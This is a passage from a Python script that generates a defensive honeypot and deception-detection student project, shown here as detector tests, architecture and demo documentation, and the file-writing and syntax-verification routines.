from tokens.canary_manager import CanaryManager


def _event(**data):
    return {"timestamp": "2024-01-01T10:00:00Z", "source_ip": "9.9.9.9",
            "source_port": 4, "decoy": "ssh",
            "event_type": "auth_attempt", "data": data, "raw": ""}


def test_canary_credentials_are_critical():
    canaries = CanaryManager({})
    u, p = canaries.pairs[0]
    verdict = evaluate_rules(_event(username=u, password=p), canaries)
    assert verdict["label"] == "malicious"
    assert verdict["severity"] == 5


def test_common_username_is_suspicious():
    verdict = evaluate_rules(_event(username="root", password="toor"),
                             CanaryManager({}))
    assert verdict["label"] == "suspicious"


def test_benign_health_check_raises_nothing():
    ev = {"timestamp": "2024-01-01T10:00:00Z", "source_ip": "127.0.0.1",
          "source_port": 1, "decoy": "mysql", "event_type": "connection",
          "data": {"note": "internal health check"}, "raw": ""}
    assert evaluate_rules(ev, CanaryManager({})) is None
'''),

("tests/test_model.py", r'''from ai.data_generator import generate_dataset
from ai.feature_extractor import extract_features, vectorize
from ai.model import ThreatClassifier


def test_model_learns_all_classes():
    events, labels = generate_dataset(300, seed=1)
    X = [vectorize(extract_features(e)) for e in events]
    clf = ThreatClassifier()
    clf.train(X, labels, n_estimators=20)
    preds = clf.predict(X[:5])
    assert len(preds) == 5
    assert all(p[0] in ("benign", "suspicious", "malicious") for p in preds)
'''),

("docs/architecture.md", r'''# Architecture

        ATTACKER/SCANNER
              |
              v
   DECEPTION LAYER (decoys/)
   SSH:2222 HTTP:8080 FTP:2121 Telnet:2323 MySQL:33060
   + canary token files (deployed_tokens/)
              |  events (thread-safe EventBus)
              v
   ANALYSIS ENGINE (engine/ + ai/)
   rules engine + feature extractor + RandomForest
   + brute-force sliding-window detector  -> fused VERDICT
              |                       |
              v                       v
   SQLite (data/deception.db)   AlertManager (console/log/webhook
   events | alerts | blocklist  + SIMULATED auto-block)
                                      |
                                      v
                     Dashboard (desktop window or browser)

| Component     | Files                        | Responsibility                   |
|---------------|------------------------------|----------------------------------|
| Decoys        | decoys/*                     | Fake services that lure attackers|
| Canary tokens | tokens/canary_manager.py     | Fake secrets; trip silent alarms |
| Event bus     | engine/event_bus.py          | Thread-safe queue decoys->engine |
| Rules engine  | engine/rules.py              | Deterministic high-confidence    |
| AI model      | ai/*                         | Features + RandomForest          |
| Orchestrator  | engine/orchestrator.py       | Fuses rule/ML/brute verdicts     |
| Alerting      | alerts/alert_manager.py      | Notify + simulated blocking      |
| Storage       | engine/database.py           | SQLite events/alerts/blocklist   |
| Dashboard     | dashboard/*, desktop_app.py  | Desktop web UI + attack button   |
| Simulator     | simulate/attack_simulator.py | Safe local attack campaign       |

Design decisions (viva talking points):
1. Hybrid detection: deterministic rules for must-not-miss signals (canary),
   ML for generalisation. Defense in depth.
2. Low-interaction decoys: zero pivot risk (no real exploits inside).
3. Only canary credentials authenticate on the SSH decoy -> any successful
   login is by definition an intrusion (zero false positives).
4. Train/serve feature parity: same extract_features()/vectorize() everywhere.
5. Synthetic training data: no real/sensitive data needed.
6. Safety: high ports, localhost, simulated blocking only.
'''),

("docs/demo_script.md", r'''# Demo Script (5 minutes)

1. Open the desktop app (python desktop_app.py or VS Code Run button).
2. Explain: fake services + canary tokens; touching them is suspicious by
   definition; AI classifies every interaction; analysts see only what matters.
3. Click SIMULATE ATTACK and narrate:
   - Scenario 0: benign health checks -> AI correctly stays silent.
   - Scenario 1: port scan -> every banner is fake.
   - Scenario 2: Telnet brute force -> sliding-window detector + ML fire.
   - Scenario 3: attacker uses STOLEN CANARY credentials -> SEV 5 CRITICAL,
     source auto-blocked. Zero false positives by design.
   - Scenario 4: SQL injection + path traversal -> rules + ML classify.
4. Point at the dashboard: stat cards, SEV-5 alert, BLOCKED chip, event table.

Viva Q&A:
- Why Random Forest? Fast, robust, probabilistic, great on tabular features.
- Why rules AND ML? Rules = precision on known-critical signals; ML = recall
  on unknown patterns; hybrid cuts both false negatives and alert fatigue.
- Training data? Seeded synthetic generator (benign/suspicious/malicious).
- Safe? Yes: no real exploits, high ports, localhost, simulated blocking.
- vs IDS? IDS watches real assets; deception moves first contact to fake
  assets -> earlier detection, near-zero false positives.
'''),
]


def build(root, force=False):
    existing = [rel for rel, _ in FILES if os.path.exists(os.path.join(root, rel))]
    if existing and not force:
        answer = input(f"! {len(existing)} file(s) already exist in {root}.\n"
                       "  Overwrite? [y/N] ")
        if answer.strip().lower() != "y":
            print("Aborted.")
            return 0

    os.makedirs(root, exist_ok=True)
    for rel, content in FILES:
        path = os.path.join(root, rel)
        folder = os.path.dirname(path)
        if folder:
            os.makedirs(folder, exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(content)
            if content and not content.endswith("\n"):
                fh.write("\n")
        print(f"  + {rel}")
    return len(FILES)


def verify(root):
    """Compile every generated .py file. Returns list of (rel, error)."""
    bad = []
    for rel, _ in FILES:
        if not rel.endswith(".py"):
            continue
        try:
            py_compile.compile(os.path.join(root, rel), doraise=True)
        except py_compile.PyCompileError as exc:
            bad.append((rel, str(exc)))
    return bad


def main():
    ap = argparse.ArgumentParser(
        description=f"Build the AI Cyber Deception Engine ({len(FILES)} files).")
    group = ap.add_mutually_exclusive_group()
    group.add_argument("--here", action="store_true",
                       help="build into the CURRENT folder")
    group.add_argument("--dir", metavar="PATH", help="build into a folder")
    ap.add_argument("--force", action="store_true")
    args = ap.parse_args()

    if args.dir:
        root = os.path.abspath(args.dir)
    elif args.here:
        root = os.getcwd()
    else:
        root = os.path.join(os.getcwd(), "ai-cyber-deception-engine")

    print("=" * 62)
    print("  AI CYBER DECEPTION ENGINE - builder (desktop app edition)")
    print("=" * 62)
    print(f"  Target: {root}\n")

    n = build(root, force=args.force)
    if n == 0:
        return

    print(f"\n[OK] {n} files written. Verifying Python syntax ...")
    bad = verify(root)
    if bad:
        print("\n[FAIL] Some files did not compile:")
        for rel, err in bad:
            print("  -", rel, "\n", err)
        sys.exit(1)

    print(f"[OK] ALL {sum(1 for r, _ in FILES if r.endswith('.py'))} "
          "Python files compile cleanly.")
    print("-" * 62)
    print("NEXT STEPS")
    print(f"  1. cd {root}")
    print("  2. python -m venv venv")
    print("     venv\\Scripts\\activate")
    print("  3. pip install -r requirements.txt")
    print("  4. python desktop_app.py      <-- the app! (auto-trains on 1st run)")
    print("     Then click  SIMULATE ATTACK  inside the window.")
    print("-" * 62)


if __name__ == "__main__":
    main()